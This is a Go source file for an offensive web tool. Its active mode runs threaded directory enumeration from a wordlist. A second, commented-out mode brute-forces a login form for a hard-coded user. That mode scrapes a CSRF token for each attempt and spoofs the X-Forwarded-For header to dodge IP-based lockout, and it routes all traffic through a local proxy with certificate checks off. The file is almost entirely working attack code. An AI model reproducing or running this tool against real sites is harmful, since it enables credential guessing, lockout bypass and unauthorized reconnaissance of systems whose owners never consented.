package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"crypto/tls"
)

func main() {
	//bruteMain()
	directoryMain()
}

///// login brute

func bruteMain() {
	var err error

	// target url
	targetUrl := os.Args[1]

	// file name for enumeration
	fileName := os.Args[2]

	// number of threads
	threads, err := strconv.Atoi(os.Args[3])
	fatalIfErr(err)

	// measure execution time
	start := time.Now()

	// read password list (producer)
	ch := make(chan string)
	go fileBufferedReader(fileName, ch)

	// setup and create workers (consumers)
	r := regexp.MustCompile(`input.+?name="tokenCSRF".+?value="(.+?)"`)
	ctx, cancelFun := context.WithCancel(context.Background())
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go bruteBunnyWorker(targetUrl, r, ch, ctx, cancelFun, &wg)
	}

	// wait for workers to finish before printing execution time
	wg.Wait()
	fmt.Printf("%.2fs elapsed\n", time.Since(start).Seconds())
}

func bruteBunnyWorker(fullUrl string, r *regexp.Regexp, ch chan string, ctx context.Context, cancelFun context.CancelFunc, wg *sync.WaitGroup) {
	defer wg.Done()
	toorbnny := NewToorBnny()

	for passwd := range ch {
		select {
		case <-ctx.Done():
			break
		default:
			token := getCsrfToken(toorbnny, fullUrl, r)
			if postLoginAttempt(toorbnny, fullUrl, token, passwd) {
				fmt.Printf("[*] Password found: %s\n", passwd)
				cancelFun()
				break
			}
		}
	}
}

func postLoginAttempt(toorbnny *ToorBnny, fullUrl, token, passwd string) bool {
	// request headers
	headers := http.Header{}
	headers.Add("X-Forwarded-For", passwd)
	headers.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0")
	headers.Set("Referer", fullUrl)

	// form data
	data := url.Values{}
	data.Add("tokenCSRF", token)
	data.Add("username", "fergus")
	data.Add("password", passwd)
	data.Add("save", "")
	encodedData := FormBodyEncoder(data, headers)

	// post response
	response, err := toorbnny.Post(fullUrl, headers, encodedData)
	fatalIfErr(err)

	return response.Header.Get("Location") == "/admin/dashboard"
}

func getCsrfToken(toorbnny *ToorBnny, url string, r *regexp.Regexp) string {
	response, err := toorbnny.Get(url, nil)
	fatalIfErr(err)

	token := r.FindStringSubmatch(string(*response.Body))[1]
	return token
}

///// directory enum

func directoryMain() {
	// target url
	url := os.Args[1]

	// file name for enumeration
	fileName := os.Args[2]

	// number of threads
	threads, err := strconv.Atoi(os.Args[3])
	fatalIfErr(err)

	// measure execution time
	start := time.Now()

	// read password list (producer)
	ch := make(chan string)
	go fileBufferedReader(fileName, ch)

	// setup and create workers (consumers)
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go directoryBunnyWorker(url, ch, &wg, i)
	}

	// wait for all workers to finish before printing execution time
	wg.Wait()
	fmt.Printf("%.2fs elapsed\n", time.Since(start).Seconds())
}

func directoryBunnyWorker(baseUrl string, ch chan string, wg *sync.WaitGroup, id int) {
	defer wg.Done()
	toorbnny := NewToorBnny()
	count := 0
	sum := 0.0
	
	for work := range ch {
		for _, payload := range payloadGenerator(work) {
			fullUrl := fmt.Sprintf("%s/%s", baseUrl, payload)

			response, err := toorbnny.Head(fullUrl, nil)
			if err != nil {
				fmt.Println(err)
				continue
			}

			count++
			sum += response.Latency
			if response.StatusCode != 404 {
				fmt.Printf("-> (%d) %s\n", response.StatusCode, fullUrl)
			}

			if id == 0 && count%100 == 0 {
				fmt.Printf("[*] Iteration ~= %d | Trying = %s | Avg = %.2fs\n",
					count,
					work,
					sum/float64(count),
				)
			}
		}
	}
}

///// util

func payloadGenerator(payload string) []string {
	escaped := url.QueryEscape(payload)
	return []string{ 
		escaped, 
		escaped + "/", 
		escaped + ".txt",
		escaped + ".php",
	}
}

func fileBufferedReader(fileName string, ch chan<- string) {
	file, err := os.Open(fileName)
	fatalIfErr(err)
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		ch <- line
	}
	fatalIfErr(scanner.Err())

	close(ch)
}

func fatalIfErr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

///// lib

type ToorBnny struct {
	*http.Client
}

type Response struct {
	*http.Response
	Body    *[]byte
	Latency float64
}

func NewToorBnny() *ToorBnny {
	proxyStr := "http://localhost:8080"
	proxyUrl, err := url.Parse(proxyStr)
	fatalIfErr(err)

	transport := &http.Transport{
		MaxIdleConns:       40,
		IdleConnTimeout:    15 * time.Second,
		DisableCompression: true,
		Proxy:              http.ProxyURL(proxyUrl),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	jar, err := cookiejar.New(nil)
	fatalIfErr(err)

	toorbnny := &ToorBnny{
		&http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Timeout:   15 * time.Second,
			Transport: transport,
			Jar:       jar,
		},
	}

	return toorbnny
}

func FormBodyEncoder(values url.Values, headers http.Header) io.Reader {
	encodedData := values.Encode()
	body := strings.NewReader(string(encodedData))
	headers.Set("Content-Type", "application/x-www-form-urlencoded")
	return body
}

func JsonBodyEncoder(values url.Values, headers http.Header) io.Reader {
	encodedData, err := json.Marshal(values)
	fatalIfErr(err)

	body := strings.NewReader(string(encodedData))
	headers.Set("Content-Type", "application/json")
	return body
}

func (t ToorBnny) Get(url string, headers http.Header) (*Response, error) {
	return t.doRequest(http.MethodGet, url, headers, nil)
}

func (t ToorBnny) Head(url string, headers http.Header) (*Response, error) {
	return t.doRequest(http.MethodHead, url, headers, nil)
}

func (t ToorBnny) Post(url string, headers http.Header, data io.Reader) (*Response, error) {
	return t.doRequest(http.MethodPost, url, headers, data)
}

func (t ToorBnny) doRequest(method, url string, headers http.Header, data io.Reader) (*Response, error) {
	// create request
	request, err := http.NewRequest(method, url, data)
	if err != nil {
		return nil, err
	}

	// add headers
	for k, h := range headers {
		for _, v := range h {
			request.Header.Add(k, v)
		}
	}

	addIfNotExists(request.Header, "Accept", "*/*")
	addIfNotExists(request.Header, "Accept-Encoding", "*")

	// do request
	start := time.Now()
	response, err := t.Do(request)
	latency := time.Since(start).Seconds()
	if err != nil {
		return nil, err
	}

	// read response
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return nil, err
	}

	return &Response{
		Response: response,
		Body:     &body,
		Latency:  latency,
	}, nil
}

func addIfNotExists(headers http.Header, key, value string) {
	if _, ok := headers[key]; !ok {
		headers.Add(key, value)
	}
}
